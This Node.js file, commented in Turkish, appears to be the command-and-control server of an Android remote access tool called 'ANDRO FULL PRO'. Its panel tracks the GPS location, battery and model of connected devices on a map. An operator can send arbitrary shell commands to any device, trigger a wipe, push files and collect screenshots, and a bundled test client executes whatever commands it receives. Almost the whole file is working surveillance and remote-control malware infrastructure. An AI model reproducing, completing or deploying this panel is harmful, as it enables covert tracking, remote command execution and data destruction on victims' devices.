// andro_panel_ultimate_full.js
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

// --- Ayarlar ---
const PORT = process.argv[2] || 9400;
const ADMIN_TOKEN = process.argv[3] || 'ULTIMATE_2026';
const UPLOAD_DIR = path.join(__dirname, 'uploads');
const SCREENSHOT_DIR = path.join(__dirname,'screenshots');

[UPLOAD_DIR, SCREENSHOT_DIR].forEach(d=>{if(!fs.existsSync(d)) fs.mkdirSync(d);});

// --- Veritabanı (SQLite) ---
let sqlite3;
try { sqlite3 = require('sqlite3').verbose(); }
catch(e){ console.error("Lütfen sqlite3 kurun: npm install sqlite3"); process.exit(1); }
const db = new sqlite3.Database('./andro_full.db');
db.serialize(()=>{
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY, name TEXT, model TEXT, battery INTEGER, memory INTEGER, gps TEXT, status TEXT
    )`);
});

// --- Express ---
app.use(express.static(__dirname));
app.use(express.urlencoded({extended:true}));
app.use(express.json());

// --- Panel ---
app.get('/panel', (req,res)=>{
    if(req.query.token!==ADMIN_TOKEN) return res.status(401).send("Yetkisiz Erişim!");
    res.send(`
<!DOCTYPE html>
<html>
<head>
<title>ANDRO FULL PRO</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<style>
body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;}
.card{background:#151515;border:1px solid #00ff00;margin-top:10px;}
.terminal{background:#000;height:100px;overflow-y:auto;padding:5px;border:1px solid #333;font-size:12px;}
.online-blink{height:10px;width:10px;background:#00ff00;border-radius:50%;display:inline-block;animation:blink 1s infinite;}
@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}
.thumbnail{width:60px;height:60px;object-fit:cover;margin:2px;border:1px solid #ccc;cursor:pointer;}
#map{height:150px;margin-bottom:10px;border:1px solid #333;}
</style>
</head>
<body class="container-fluid">
<h2 class="mt-3 text-center">--- ANDRO FULL PRO PANEL ---</h2>
<div id="map"></div>
<div class="row" id="devices"></div>
<canvas id="statsChart" height="100"></canvas>

<script>
const socket = io();
let clients={};

const map = L.map('map').setView([0,0],1);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap'}).addTo(map);
const markers={};

function renderUI(){
    const container=document.getElementById('devices');
    container.innerHTML='';
    let cmdData=[], fileData=[], ssData=[];
    for(let id in clients){
        const c=clients[id];
        container.innerHTML+=\`
        <div class="col-md-4">
            <div class="card p-2">
                <div class="d-flex justify-content-between">
                    <span>\${c.name} [\${c.model}]</span>
                    <span class="\${c.online?'online-blink':''}"></span>
                </div>
                <p>🔋 Pil: \${c.battery}% | Hafıza: \${c.memory}%</p>
                <div class="terminal" id="term_\${id}"></div>
                <input type="text" class="form-control form-control-sm bg-dark text-success mb-1" 
                    id="in_\${id}" placeholder="Komut" onkeypress="if(event.keyCode==13) sendCmd('\${id}')">
                <div class="d-flex gap-1">
                    <button class="btn btn-sm btn-outline-success w-50" onclick="sendCmd('\${id}')">KOMUT</button>
                    <button class="btn btn-sm btn-outline-danger w-50" onclick="wipe('\${id}')">WIPE</button>
                </div>
                <div class="mt-1">
                    <label>Dosya Yükle:</label>
                    <input type="file" id="file_\${id}" class="form-control form-control-sm" onchange="uploadFile(event,'\${id}')">
                    <div id="progress_\${id}" class="progress mt-1"><div class="progress-bar bg-success" style="width:0%"></div></div>
                </div>
                <div class="mt-1">
                    <label>Screenshot:</label>
                    \${(c.screenshots||[]).map(f=>'<img src="/screenshots/'+f+'" class="thumbnail" onclick="window.open(this.src)"/>').join('')}
                </div>
            </div>
        </div>\`;
        cmdData.push(c.logs?.length||0);
        fileData.push(c.files?.length||0);
        ssData.push(c.screenshots?.length||0);

        if(c.gps){
            let coords=c.gps.split(',');
            if(markers[id]) markers[id].setLatLng([parseFloat(coords[0]),parseFloat(coords[1])]);
            else markers[id]=L.marker([parseFloat(coords[0]),parseFloat(coords[1])]).addTo(map).bindPopup(c.name);
        }
    }
    map.fitBounds(Object.values(markers).map(m=>m.getLatLng()),{padding:[20,20]});

    // Grafik
    statsChart.data.labels=Object.keys(clients);
    statsChart.data.datasets[0].data=cmdData;
    statsChart.data.datasets[1].data=fileData;
    statsChart.data.datasets[2].data=ssData;
    statsChart.update();
}

function sendCmd(id){
    const val=document.getElementById('in_'+id).value;
    if(!val.trim()){alert('Komut boş!');return;}
    socket.emit('admin_cmd',{target:id,cmd:val});
}

function wipe(id){socket.emit('admin_cmd',{target:id,cmd:'ACTION_WIPE'});}
function uploadFile(e,id){
    const file=document.getElementById('file_'+id).files[0];
    if(!file){alert('Dosya seçin!');return;}
    const reader=new FileReader();
    reader.onload=()=>{socket.emit('fileUpload',{target:id,name:file.name,data:reader.result});
        document.querySelector('#progress_'+id+' .progress-bar').style.width='100%';
        setTimeout(()=>document.querySelector('#progress_'+id+' .progress-bar').style.width='0%',500);
    }
    reader.readAsDataURL(file);
}

// Grafik setup
const ctx=document.getElementById('statsChart').getContext('2d');
const statsChart=new Chart(ctx,{
    type:'bar',
    data:{labels:[],datasets:[
        {label:'Komut',data:[],backgroundColor:'rgba(54,162,235,0.6)'},
        {label:'Dosya',data:[],backgroundColor:'rgba(255,99,132,0.6)'},
        {label:'Screenshot',data:[],backgroundColor:'rgba(75,192,192,0.6)'}
    ]},
    options:{responsive:true,scales:{y:{beginAtZero:true}}}
});

socket.on('updateUI',data=>{clients=data;renderUI();});
socket.on('output',d=>{const t=document.getElementById('term_'+d.id);if(t){t.innerHTML+='<div>'+d.msg+'</div>';t.scrollTop=t.scrollHeight;}});
</script>
</body>
</html>
`);
});

// --- Dosya ve Screenshot route ---
app.get('/screenshots/:file',(req,res)=>{const f=req.params.file;const p=path.join(SCREENSHOT_DIR,f);if(fs.existsSync(p)) res.sendFile(p); else res.status(404).send("Not found");});

// --- SOCKET.IO ---
let clients={};
io.on('connection',socket=>{
    console.log('Yeni bağlandı:',socket.id);
    socket.on('register',data=>{
        clients[socket.id]={...data,id:socket.id,online:true,logs:[],files:[],screenshots:[]};
        io.emit('updateUI',clients);
    });
    socket.on('admin_cmd',pkg=>{
        io.to(pkg.target).emit('exec',pkg.cmd);
    });
    socket.on('fileUpload',pkg=>{
        const base64=pkg.data.split(',')[1];
        fs.writeFileSync(path.join(UPLOAD_DIR,pkg.name),Buffer.from(base64,'base64'));
        if(clients[pkg.target]) clients[pkg.target].files.push(pkg.name);
        io.emit('updateUI',clients);
    });
    socket.on('screenshot',pkg=>{
        const base64=pkg.data.split(',')[1];
        const fpath=path.join(SCREENSHOT_DIR,pkg.name);
        fs.writeFileSync(fpath,Buffer.from(base64,'base64'));
        if(clients[socket.id]) clients[socket.id].screenshots.push(pkg.name);
        io.emit('updateUI',clients);
    });
    socket.on('resp',msg=>{io.emit('output',{id:socket.id,msg:msg});});
    socket.on('disconnect',()=>{if(clients[socket.id]) clients[socket.id].online=false;io.emit('updateUI',clients);});
});

// --- TEST CLIENT ---
const ioClient=require('socket.io-client');
const client=ioClient.connect(`http://localhost:${PORT}`);
client.on('connect',()=>{client.emit('register',{name:'TestDevice',model:'Android14',battery:90,memory:60,gps:'37.7749,-122.4194'});});
client.on('exec',cmd=>{exec(cmd,(err,stdout,stderr)=>{client.emit('resp',stdout||stderr||"İşlem tamam");});});

// --- START SERVER ---
http.listen(PORT,()=>{console.log(`\x1b[32m[+] Panel aktif: http://localhost:${PORT}/panel?token=${ADMIN_TOKEN}\x1b[0m`);});